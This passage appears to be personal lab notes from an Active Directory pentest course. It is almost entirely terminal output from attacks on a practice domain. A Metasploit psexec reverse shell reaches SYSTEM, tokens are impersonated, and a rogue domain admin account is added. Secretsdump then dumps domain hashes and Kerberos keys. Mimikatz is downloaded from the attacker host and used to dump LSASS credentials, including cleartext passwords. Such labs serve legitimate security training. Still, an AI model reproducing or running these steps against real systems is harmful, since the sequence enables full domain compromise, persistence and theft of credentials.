[*] 192.168.126.132:445 - Authenticating to 192.168.126.132:445|MARVEL.local as user 'fcastle'...
[*] 192.168.126.132:445 - Selecting PowerShell target
[*] 192.168.126.132:445 - Executing the payload...
[-] 192.168.126.132:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.126.130:4444 
[*] 192.168.126.132:445 - Connecting to the server...
[*] 192.168.126.132:445 - Authenticating to 192.168.126.132:445|MARVEL.local as user 'fcastle'...
[*] 192.168.126.132:445 - Selecting PowerShell target
[*] 192.168.126.132:445 - Executing the payload...
[+] 192.168.126.132:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (203846 bytes) to 192.168.126.132
[*] Meterpreter session 1 opened (192.168.126.130:4444 -> 192.168.126.132:53945) at 2025-04-18 00:57:21 -0400

meterpreter > shell
Process 7760 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
Font Driver Host\UMFD-2
MARVEL\Administrator
MARVEL\fcastle
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1
Window Manager\DWM-2

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token marvel\\fcastle
[+] Delegation token available
[+] Successfully impersonated user MARVEL\fcastle
meterpreter > shell
Process 5728 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\fcastle

C:\Windows\system32>^C
Terminate channel 2? [y/N]  y
meterpreter > rev2self
meterpreter > get uid
[-] Unknown command: get. Did you mean getwd? Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
MARVEL\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token MARVEL\\Administrator
[+] Delegation token available
[+] Successfully impersonated user MARVEL\Administrator
meterpreter > shell
Process 7188 created.
Channel 3 created.
Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
marvel\administrator

C:\Windows\system32>net user /add hawkeye Password1@ /domain
net user /add hawkeye Password1@ /domain
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.

C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
net group "Domain Admins" hawkeye /ADD /DOMAIN
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.

```

Validating it works

```bash
└─$ python3 /home/kali/.local/bin/secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.126.131

Impacket v0.13.0.dev0+20250415.195618.c384b5f - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x87e9962376bee6276c9c80bd6ca9fdef
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:d2ed88d44321631bf89feb7df4cd4b536813d77c78ba25234c257b125fc70dfe
MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:28e18457f18b42042ed835177e4deddd
MARVEL\HYDRA-DC$:des-cbc-md5:4a6e044386a41cd9
MARVEL\HYDRA-DC$:plain_password_hex:5fb20bf910043ba31e7803bf69c9a8188dd3180802ef12ab282266eec4b41bb2f8268d1f4d424366c018b787a7446b209196f0fc37061904c2b4d38151db9e02ad08590ba3a275075ac0d5766e2ff9c0063f3c5a7a09e3cc013210effc46458dc226b7e12397222ee24ce53c12f1c492e8b0fb278507bfc5c02f3eb71da3cc19b4db0a266d9a60bfbde741b16e292daf9fa9208d3621d80fa320916f8723daa225b5cce8eaf29c73d08a2bf4d168a4af6c6d9037b7f6d158bdf23feb68fadd7f5ed6d637336a76f17a5eed9ffe8aaaa152c1374e9792a274d92bea4604a8ee927cb8ad8e4b9e1309d332d269784fdcff
MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:10ea909cc2f3d5fd9ff58aab67981c80:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x97ae1d1b3ebda7255c0aadf36bbbfd49688526e7
dpapi_userkey:0x1d86e04297a54ae6bed75374a262e8b56615b766
[*] NL$KM 
 0000   E1 C2 25 00 90 67 B0 1A  63 7A 74 0C FD A5 7E 56   ..%..g..czt...~V
 0010   4D 93 73 6A 47 92 07 8D  6E 1D E3 B1 10 92 1C BC   M.sjG...n.......
 0020   C4 10 A9 35 C1 C7 1D 02  FF E9 3F 37 2C F5 8F F8   ...5......?7,...
 0030   A1 1E 2E A0 8B 56 33 27  F5 B8 04 B6 5D 86 70 B4   .....V3'....].p.
NL$KM:e1c225009067b01a637a740cfda57e564d93736a4792078d6e1de3b110921cbcc410a935c1c71d02ffe93f372cf58ff8a11e2ea08b563327f5b804b65d8670b4
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1bb8e66d067c3f9c7c42d72c0ec3e768:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
MARVEL.local\SQL Service:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
hawkeye:1109:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:10ea909cc2f3d5fd9ff58aab67981c80:::
FRANKCASTLE$:1107:aad3b435b51404eeaad3b435b51404ee:129ed04a1eeb1e35888c0d2ebf69ec18:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:23e58192bce5f41ef46ebb67d5ae578d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7b2a8311c2f4b545f65cab444f5dd5edc12f7b5e7a11911362d129821d961bf3
Administrator:aes128-cts-hmac-sha1-96:afa6adf45cb9fa242b685e26a6aa65b6
Administrator:des-cbc-md5:83548cd964c2a49e
krbtgt:aes256-cts-hmac-sha1-96:01d272bc05622af7773319f5b83f21ada4f256a98e692e540b942175e6c129e8
krbtgt:aes128-cts-hmac-sha1-96:b8500bbc7bfc70f3c900c4fdcc6cec26
krbtgt:des-cbc-md5:5b4975bf9bd09220
MARVEL.local\tstark:aes256-cts-hmac-sha1-96:c0253feb8fa1a0532844adabe1db7b12a0e9c2e12b84d6640ed886025c175b50
MARVEL.local\tstark:aes128-cts-hmac-sha1-96:68727fb995192f9766d6294ffd64080c
MARVEL.local\tstark:des-cbc-md5:f2253d9e1373adcd
MARVEL.local\SQL Service:aes256-cts-hmac-sha1-96:85c7a4e514f4c892eb31967428ba18dcf9b449d1c24991cbe82432ac0f7916a9
MARVEL.local\SQL Service:aes128-cts-hmac-sha1-96:af7bda1d251a8d4fb369f7166c72e4e1
MARVEL.local\SQL Service:des-cbc-md5:466d67c21cb0ad9b
MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409
MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9
MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954
MARVEL.local\pparker:aes256-cts-hmac-sha1-96:906e23c09d876f3238f3ff8f2c247388ab36f7bc744cfbd4cb2b8f5a14e8914f
MARVEL.local\pparker:aes128-cts-hmac-sha1-96:339d007f3b450b6233607587d7ee0103
MARVEL.local\pparker:des-cbc-md5:61756889adfb4c29
hawkeye:aes256-cts-hmac-sha1-96:70306b40ac0b9da21903551fa70b3191b61d88749e356b11cbe93721a0d3b471
hawkeye:aes128-cts-hmac-sha1-96:2ee48035a17365b1951d8a8105c917e4
hawkeye:des-cbc-md5:01f758f731b6757c
HYDRA-DC$:aes256-cts-hmac-sha1-96:d2ed88d44321631bf89feb7df4cd4b536813d77c78ba25234c257b125fc70dfe
HYDRA-DC$:aes128-cts-hmac-sha1-96:28e18457f18b42042ed835177e4deddd
HYDRA-DC$:des-cbc-md5:40929e25ad6b984c
FRANKCASTLE$:aes256-cts-hmac-sha1-96:7e3d22a46a557c3521375bd5a23215ad591220b6fbcc7bac2be9483d9fa50df2
FRANKCASTLE$:aes128-cts-hmac-sha1-96:c2bc87d174eb2a812a5812a8df8fe62a
FRANKCASTLE$:des-cbc-md5:5ebf13ead3dcd0ad
SPIDERMAN$:aes256-cts-hmac-sha1-96:51d31293b79109b275b96310b36953cf7843a19d6ec043e9f62bc386d6f95b2a
SPIDERMAN$:aes128-cts-hmac-sha1-96:1c0e440743dd60e3030c42b7cdddf0d2
SPIDERMAN$:des-cbc-md5:40cb61c4e05ecd6e
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7f94bc289440>
Traceback (most recent call last):
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 185, in __del__
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 182, in close
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 360, in close
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smbconnection.py", line 605, in closeFile
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1357, in close
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7f94bc289440>
Traceback (most recent call last):
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 185, in __del__
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 182, in close
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 360, in close
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smbconnection.py", line 605, in closeFile
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1357, in close
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
  File "/home/kali/.local/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'

```


## Mimikatz Overview

Tool used to view and steal credentials 

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

![image.png](attachment:19422029-ec93-45d7-b0eb-8f8f24f3bab8:image.png)

```bash
Invoke-WebRequest -Uri http://192.168.126.135/mimikatz.exe -OutFile mimikatz.exe

```

```bash
cUserspeterparkerDownloadsmimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 174408
 .## ^ ##.  A La Vie, A L'Amour - (oe.eo)
 ##   ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ##   ##        httpsblog.gentilkiwi.commimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'         httpspingcastle.com  httpsmysmartlogon.com 

mimikatz # privilege
ERROR mimikatz_doLocal ; (null) command of privilege module not found !

Module         privilege
Full name      Privilege module

           debug  -  Ask debug privilege
          driver  -  Ask load driver privilege
        security  -  Ask security privilege
             tcb  -  Ask tcb privilege
          backup  -  Ask backup privilege
         restore  -  Ask restore privilege
          sysenv  -  Ask system environment privilege
              id  -  Ask a privilege by its id
            name  -  Ask a privilege by its name

mimikatz # privilegedebug
Privilege '20' OK

mimikatz # sekurlsa
ERROR mimikatz_doLocal ; (null) command of sekurlsa module not found !

Module         sekurlsa
Full name      SekurLSA module
Description    Some commands to enumerate credentials...

             msv  -  Lists LM & NTLM credentials
         wdigest  -  Lists WDigest credentials
        kerberos  -  Lists Kerberos credentials
           tspkg  -  Lists TsPkg credentials
         livessp  -  Lists LiveSSP credentials
         cloudap  -  Lists CloudAp credentials
             ssp  -  Lists SSP credentials
  logonPasswords  -  Lists all available providers credentials
         process  -  Switch (or reinit) to LSASS process  context
        minidump  -  Switch (or reinit) to LSASS minidump context
         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
             pth  -  Pass-the-hash
          krbtgt  -  krbtgt!
     dpapisystem  -  DPAPI_SYSTEM secret
           trust  -  Antisocial
      backupkeys  -  Preferred Backup Master keys
         tickets  -  List Kerberos tickets
           ekeys  -  List Kerberos Encryption Keys
           dpapi  -  List Cached MasterKeys
         credman  -  List Credentials Manager

mimikatz # sekurlsalogonPasswords

Authentication Id  0 ; 377576 (000000000005c2e8)
Session            Interactive from 1
User Name          peterparker
Domain             SPIDERMAN
Logon Server       SPIDERMAN
Logon Time         4192025 20030 PM
SID                S-1-5-21-1226990740-2828406409-1400808678-1001
        msv 
         [00000003] Primary
          Username  peterparker
          Domain    SPIDERMAN
          NTLM      64f12cddaa88057e06a81b54e73b949b
          SHA1      cba4e545b7ec918129725154b29f055e4cd5aea8
          DPAPI     cba4e545b7ec918129725154b29f055e
        tspkg 
        wdigest 
          Username  peterparker
          Domain    SPIDERMAN
          Password  (null)
        kerberos 
          Username  peterparker
          Domain    SPIDERMAN
          Password  (null)
        ssp 
        credman 
         [00000000]
          Username  MARVELadministrator
          Domain    HYDRA-DC
          Password  P@$$w0rd!
        cloudap 

Authentication Id  0 ; 377391 (000000000005c22f)
Session            Interactive from 1
User Name          peterparker
Domain             SPIDERMAN
Logon Server       SPIDERMAN
Logon Time         4192025 20030 PM
SID                S-1-5-21-1226990740-2828406409-1400808678-1001
        msv 
         [00000003] Primary
          Username  peterparker
          Domain    SPIDERMAN
          NTLM      64f12cddaa88057e06a81b54e73b949b
          SHA1      cba4e545b7ec918129725154b29f055e4cd5aea8
          DPAPI     cba4e545b7ec918129725154b29f055e
        tspkg 
        wdigest 
          Username  peterparker
          Domain    SPIDERMAN
          Password  (null)
        kerberos 
          Username  peterparker
          Domain    SPIDERMAN
          Password  (null)
        ssp 
        credman 
         [00000000]
          Username  MARVELadministrator
          Domain    HYDRA-DC
          Password  P@$$w0rd!
        cloudap 

Authentication Id  0 ; 77828 (0000000000013004)
Session            Interactive from 1
User Name          DWM-1
Domain             Window Manager
Logon Server       (null)
Logon Time         4192025 15909 PM
SID                S-1-5-90-0-1
        msv 
         [00000003] Primary
          Username  SPIDERMAN$
          Domain    MARVEL
          NTLM      23e58192bce5f41ef46ebb67d5ae578d
          SHA1      585144de343843308ca0b1d39282a5b529013530
          DPAPI     585144de343843308ca0b1d39282a5b5
        tspkg 
        wdigest 
          Username  SPIDERMAN$
          Domain    MARVEL
          Password  (null)
        kerberos 
          Username  SPIDERMAN$
          Domain    MARVEL.local
          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 77811 (0000000000012ff3)
Session            Interactive from 1
User Name          DWM-1
Domain             Window Manager
Logon Server       (null)
Logon Time         4192025 15909 PM
SID                S-1-5-90-0-1
        msv 
         [00000003] Primary
          Username  SPIDERMAN$
          Domain    MARVEL
          NTLM      23e58192bce5f41ef46ebb67d5ae578d
          SHA1      585144de343843308ca0b1d39282a5b529013530
          DPAPI     585144de343843308ca0b1d39282a5b5
        tspkg 
        wdigest 
          Username  SPIDERMAN$
          Domain    MARVEL
          Password  (null)
        kerberos 
          Username  SPIDERMAN$
          Domain    MARVEL.local
          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 997 (00000000000003e5)
Session            Service from 0
User Name          LOCAL SERVICE
Domain             NT AUTHORITY
Logon Server       (null)
Logon Time         4192025 15909 PM
SID                S-1-5-19
        msv 
        tspkg 
        wdigest 
          Username  (null)
          Domain    (null)
          Password  (null)
        kerberos 
          Username  (null)
          Domain    (null)
          Password  (null)
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 996 (00000000000003e4)
Session            Service from 0
User Name          SPIDERMAN$
Domain             MARVEL
Logon Server       (null)
Logon Time         4192025 15908 PM
SID                S-1-5-20
        msv 
         [00000003] Primary
          Username  SPIDERMAN$
          Domain    MARVEL
          NTLM      23e58192bce5f41ef46ebb67d5ae578d
          SHA1      585144de343843308ca0b1d39282a5b529013530
          DPAPI     585144de343843308ca0b1d39282a5b5
        tspkg 
        wdigest 
          Username  SPIDERMAN$
          Domain    MARVEL
          Password  (null)
        kerberos 
          Username  spiderman$
          Domain    MARVEL.local
          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 52516 (000000000000cd24)
Session            Interactive from 0
User Name          UMFD-0
Domain             Font Driver Host
Logon Server       (null)
Logon Time         4192025 15908 PM
SID                S-1-5-96-0-0
        msv 
         [00000003] Primary
          Username  SPIDERMAN$
          Domain    MARVEL
          NTLM      23e58192bce5f41ef46ebb67d5ae578d
          SHA1      585144de343843308ca0b1d39282a5b529013530
          DPAPI     585144de343843308ca0b1d39282a5b5
        tspkg 
        wdigest 
          Username  SPIDERMAN$
          Domain    MARVEL
          Password  (null)
        kerberos 
          Username  SPIDERMAN$
          Domain    MARVEL.local
          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 52474 (000000000000ccfa)
Session            Interactive from 1
User Name          UMFD-1
Domain             Font Driver Host
Logon Server       (null)
Logon Time         4192025 15908 PM
SID                S-1-5-96-0-1
        msv 
         [00000003] Primary
          Username  SPIDERMAN$
          Domain    MARVEL
          NTLM      23e58192bce5f41ef46ebb67d5ae578d
          SHA1      585144de343843308ca0b1d39282a5b529013530
          DPAPI     585144de343843308ca0b1d39282a5b5
        tspkg 
        wdigest 
          Username  SPIDERMAN$
          Domain    MARVEL
          Password  (null)
        kerberos 
          Username  SPIDERMAN$
          Domain    MARVEL.local
          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 51131 (000000000000c7bb)
Session            UndefinedLogonType from 0
User Name          (null)
Domain             (null)
Logon Server       (null)
Logon Time         4192025 15908 PM
SID               
        msv 
         [00000003] Primary
          Username  SPIDERMAN$
          Domain    MARVEL
          NTLM      23e58192bce5f41ef46ebb67d5ae578d
          SHA1      585144de343843308ca0b1d39282a5b529013530
          DPAPI     585144de343843308ca0b1d39282a5b5
        tspkg 
        wdigest 
        kerberos 
        ssp 
        credman 
        cloudap 

Authentication Id  0 ; 999 (00000000000003e7)
Session            UndefinedLogonType from 0
User Name          SPIDERMAN$
Domain             MARVEL
Logon Server       (null)
Logon Time         4192025 15908 PM
SID                S-1-5-18
        msv 
        tspkg 
        wdigest 
          Username  SPIDERMAN$
          Domain    MARVEL
          Password  (null)
        kerberos 
          Username  spiderman$
          Domain    MARVEL.LOCAL
          Password  ;1tM9YvRHVJ$9c_O7_5!ym47EbL9K=UbSEeG-q)q'z'7;Q'N!X_)'XL4B3%&Pn$XMNh=nJC.N-9KAJTQY;!VVsY@;Y],zMr6F85mwm, &SyP(vqMf
        ssp 
        credman 
        cloudap 

mimikatz #

```
